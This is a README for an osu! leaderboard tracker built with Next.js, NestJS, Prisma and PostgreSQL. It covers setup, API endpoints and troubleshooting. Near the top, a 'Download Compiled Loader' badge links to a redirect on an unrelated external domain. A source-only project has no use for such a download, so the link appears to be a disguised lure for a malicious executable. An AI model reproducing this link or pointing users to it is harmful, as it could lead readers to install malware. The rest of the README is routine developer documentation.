# osu-ee-tracker

![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)
![Next.js](https://img.shields.io/badge/frontend-Next.js-black)
![NestJS](https://img.shields.io/badge/backend-NestJS-red)
![Prisma](https://img.shields.io/badge/ORM-Prisma-2D3748)
![PostgreSQL](https://img.shields.io/badge/database-PostgreSQL-blue)
![License](https://img.shields.io/badge/license-MIT-green)

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A full-stack osu! leaderboard tracker built with **Next.js** and **NestJS**, using **Prisma** and **PostgreSQL**.

Track player scores, filter leaderboards, and explore performance across game modes.

---

## Features

* Track osu! player scores
* Leaderboards with filtering (game mode, time range)
* Fast API with NestJS
* Type-safe DB layer with Prisma
* Modern frontend with Next.js + Tailwind

---

## Screenshots

> *Will be added once front-end is more complete*

---

## Tech Stack

| Layer    | Technology                     |
| -------- | ------------------------------ |
| Frontend | Next.js (TypeScript, Tailwind) |
| Backend  | NestJS (TypeScript)            |
| ORM      | Prisma                         |
| Database | PostgreSQL                     |

---

## Project Structure

```
osu-ee-tracker
├── client/         # Next.js frontend
└── server/         # NestJS backend
```

---

## Prerequisites

* Node.js (v18+)
* npm
* PostgreSQL (local or hosted)

---

## Setup

### 1. Clone the repository

```bash
git clone <your-repo-url>
cd osu-ee-tracker
```

---

## Backend Setup (NestJS)

```bash
cd server
npm install
```

### Install required dependencies

```bash
npm install @nestjs/config
```

---

### Create `.env`

```env
DATABASE_URL="postgresql://USER:PASSWORD@localhost:5432/osu_ee_tracker"
```

---

## First-Time Setup (IMPORTANT)

You **must generate the Prisma client** before running the backend:

```bash
npx prisma generate
```

If skipped, you may see errors like:

* `PrismaClient not found`
* Missing enums (`GameMode`, `ManiaKeys`)
* `Property 'player' does not exist`

---

### Run database migrations

```bash
npx prisma migrate dev
```

---

### Start backend

```bash
npm run start:dev
```

API runs at:

```
http://localhost:3000
```

---

## Frontend Setup (Next.js)

```bash
cd ../client
npm install
```

### Create `.env.local`

```env
NEXT_PUBLIC_API_URL=http://localhost:3000
```

---

### Start frontend

```bash
npm run dev
```

Frontend runs at:

```
http://localhost:3001
```

---

## Running Both

**Terminal 1:**

```bash
cd server
npm run start:dev
```

**Terminal 2:**

```bash
cd client
npm run dev
```

---

## Database (Prisma)

All commands must be run inside `/server`.

```bash
cd server
```

### Common commands

```bash
# Apply migrations
npx prisma migrate dev

# Generate client
npx prisma generate

# Open DB GUI
npx prisma studio
```

---

## Important Notes

### Prisma commands must run in `/server`

Wrong:

```bash
npx prisma generate
```

Correct:

```bash
cd server
npx prisma generate
```

---

## API Overview

### Create Player

```http
POST /players
```

```json
{
  "username": "player1",
  "country": "EE"
}
```

---

### 📥 Get Players

```http
GET /players
```

---

### ➕ Submit Score

```http
POST /scores
```

```json
{
  "playerId": 1,
  "pp": 250.5,
  "accuracy": 98.76,
  "gameMode": "MANIA",
  "maniaKeys": "KEYS4",
  "rank": "A"
}
```

---

### Get Leaderboard

```http
GET /scores/leaderboard?mode=MANIA&period=weekly
```

Query params:

| Param  | Type   | Description          |
| ------ | ------ | -------------------- |
| mode   | enum   | GameMode filter      |
| period | string | daily / weekly / all |

---

## Enums

Defined in Prisma:

```ts
GameMode: STANDARD | TAIKO | CATCH | MANIA
ManiaKeys: KEYS4 ... KEYS12
```

---

## Troubleshooting

### Prisma errors (VERY common)

```bash
cd server
rm -rf node_modules package-lock.json
npm install
npx prisma generate
```

---

### Schema changes not reflected

```bash
npx prisma migrate dev
```

---

### Backend won’t start

Check:

* `.env` exists
* PostgreSQL is running
* `DATABASE_URL` is correct

---

## Scripts

### Server

| Command   | Description |
| --------- | ----------- |
| start:dev | Dev mode    |
| build     | Compile TS  |
| test      | Unit tests  |
| test:e2e  | E2E tests   |

### Client

| Command | Description          |
| ------- | -------------------- |
| dev     | Start dev server     |
| build   | Build app            |
| start   | Run production build |

---

## Future Improvements

* Auth system (JWT)
* Pagination for leaderboards
* osu! API integration
* Caching (Redis)
* Docker setup

---

## License

MIT License

---


